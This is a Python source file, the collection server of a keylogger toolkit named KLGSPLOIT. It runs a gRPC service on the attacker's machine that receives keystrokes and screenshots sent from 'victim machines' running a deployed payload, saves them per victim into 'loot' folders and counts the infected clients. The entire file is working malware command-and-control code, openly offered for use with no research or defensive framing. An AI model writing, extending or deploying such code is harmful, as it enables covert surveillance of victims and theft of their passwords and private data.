#!/usr/bin/env python3
"""
Attacker Server - Receives keylogs and screenshots from victim machines

This is the server that runs on the attacker's machine to receive
keystrokes and screenshots from deployed payloads.

Usage:
    python attackerserve.py [--host HOST] [--port PORT] [--screenshots-dir DIR] [--keylogs-dir DIR]

Example:
    python attackerserve.py --host 0.0.0.0 --port 50051 --screenshots-dir ./loot/screenshots --keylogs-dir ./loot/keylogs
"""

import sys
import os
import argparse
from datetime import datetime

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import grpc
from concurrent import futures

# Import proto files
from libs.protos import server_pb2 as keylog_pb2
from libs.protos import server_pb2_grpc as keylog_pb2_grpc


class AttackerServer(keylog_pb2_grpc.KeylogServiceServicer):
    """
    Attacker's gRPC server that receives and stores keylogs and screenshots
    from victim machines running the payload.
    """
    
    def __init__(self, screenshots_dir="./received_screenshots", keylogs_dir="./received_keylogs"):
        """
        Initialize the attacker server.
        
        Args:
            screenshots_dir: directory to save received screenshots
            keylogs_dir: directory to save received keylogs
        """
        self.screenshots_dir = screenshots_dir
        self.keylogs_dir = keylogs_dir
        
        # Create directories if they don't exist
        os.makedirs(self.screenshots_dir, exist_ok=True)
        os.makedirs(self.keylogs_dir, exist_ok=True)
        
        # Statistics
        self.stats = {
            "keylogs_received": 0,
            "screenshots_received": 0,
            "clients_seen": set()
        }
        
        print(f"[*] Screenshots directory: {os.path.abspath(self.screenshots_dir)}")
        print(f"[*] Keylogs directory: {os.path.abspath(self.keylogs_dir)}")
    
    def SendKeylog(self, request, context):
        """Handle incoming keylog messages."""
        try:
            message = request.message
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Extract client info from context if available
            peer = context.peer() or "unknown"
            client_ip = peer.split(":")[-2] if ":" in peer else peer
            
            # Update stats
            self.stats["keylogs_received"] += 1
            self.stats["clients_seen"].add(client_ip)
            
            # Print to console
            print(f"[{timestamp}] [{client_ip}] KEYLOG: {message}")
            
            # Save to client-specific log file
            client_log_dir = os.path.join(self.keylogs_dir, client_ip.replace(".", "_"))
            os.makedirs(client_log_dir, exist_ok=True)
            
            log_filename = f"keylog_{datetime.now().strftime('%Y%m%d')}.txt"
            log_path = os.path.join(client_log_dir, log_filename)
            
            with open(log_path, 'a', encoding='utf-8') as f:
                f.write(f"[{timestamp}] {message}\n")
            
            return keylog_pb2.KeylogResponse(response=True)
            
        except Exception as e:
            print(f"[!] Error handling keylog: {e}")
            return keylog_pb2.KeylogResponse(response=False)
    
    def SendScreenshot(self, request, context):
        """Handle incoming screenshot data."""
        try:
            image_data = request.image_data
            filename = request.filename
            timestamp = request.timestamp
            client_id = request.client_id
            
            # Get client IP from context
            peer = context.peer() or "unknown"
            client_ip = peer.split(":")[-2] if ":" in peer else peer
            
            # Update stats
            self.stats["screenshots_received"] += 1
            self.stats["clients_seen"].add(client_id)
            
            # Create client-specific subfolder using client_id
            client_folder = os.path.join(self.screenshots_dir, client_id)
            os.makedirs(client_folder, exist_ok=True)
            
            # Ensure unique filename with timestamp
            if not filename:
                filename = f"screenshot_{timestamp}.png"
            
            base, ext = os.path.splitext(filename)
            unique_filename = f"{timestamp}_{base}{ext}"
            
            filepath = os.path.join(client_folder, unique_filename)
            
            # Save the screenshot
            with open(filepath, 'wb') as f:
                f.write(image_data)
            
            file_size = len(image_data) / 1024  # KB
            
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{client_id}] SCREENSHOT: {unique_filename} ({file_size:.1f} KB)")
            
            return keylog_pb2.ScreenshotResponse(
                success=True,
                message=f"Screenshot saved: {unique_filename}"
            )
            
        except Exception as e:
            print(f"[!] Error handling screenshot: {e}")
            return keylog_pb2.ScreenshotResponse(
                success=False,
                message=f"Error: {str(e)}"
            )
    
    def print_stats(self):
        """Print server statistics."""
        print("\n" + "=" * 50)
        print("SERVER STATISTICS")
        print("=" * 50)
        print(f"  Keylogs received: {self.stats['keylogs_received']}")
        print(f"  Screenshots received: {self.stats['screenshots_received']}")
        print(f"  Unique clients: {len(self.stats['clients_seen'])}")
        if self.stats['clients_seen']:
            print("  Client IDs:")
            for client in self.stats['clients_seen']:
                print(f"    - {client}")
        print("=" * 50 + "\n")
    
    def serve(self, host="0.0.0.0", port=50051):
        """Start the gRPC server."""
        server = grpc.server(futures.ThreadPoolExecutor(max_workers=20))
        keylog_pb2_grpc.add_KeylogServiceServicer_to_server(self, server)
        server.add_insecure_port(f"{host}:{port}")
        
        print_banner()
        print(f"[*] Attacker gRPC Server starting on {host}:{port}")
        print(f"[*] Waiting for connections from victim machines...")
        print("[*] Press Ctrl+C to stop and view statistics\n")
        
        server.start()
        
        try:
            server.wait_for_termination()
        except KeyboardInterrupt:
            print("\n[*] Server shutting down...")
            self.print_stats()
            server.stop(0)


def print_banner():
    """Print the attacker server banner."""
    banner = """
╔══════════════════════════════════════════════════════════════════╗
║             KLGSPLOIT ATTACKER SERVER v2.0                       ║
║                                                                  ║
║  Receives keylogs and screenshots from victim payloads           ║
║  by pengux8 (aka) wail sari bey and contributors                 ║
╚══════════════════════════════════════════════════════════════════╝
"""
    print(banner)


def main():
    parser = argparse.ArgumentParser(description="Attacker gRPC Server for KLGSPLOIT")
    parser.add_argument("--host", default="0.0.0.0", help="Host to bind to (default: 0.0.0.0)")
    parser.add_argument("--port", type=int, default=50051, help="Port to listen on (default: 50051)")
    parser.add_argument("--screenshots-dir", default="./received_screenshots", help="Directory to save screenshots")
    parser.add_argument("--keylogs-dir", default="./received_keylogs", help="Directory to save keylogs")
    
    args = parser.parse_args()
    
    server = AttackerServer(
        screenshots_dir=args.screenshots_dir,
        keylogs_dir=args.keylogs_dir
    )
    server.serve(host=args.host, port=args.port)


if __name__ == "__main__":
    main()
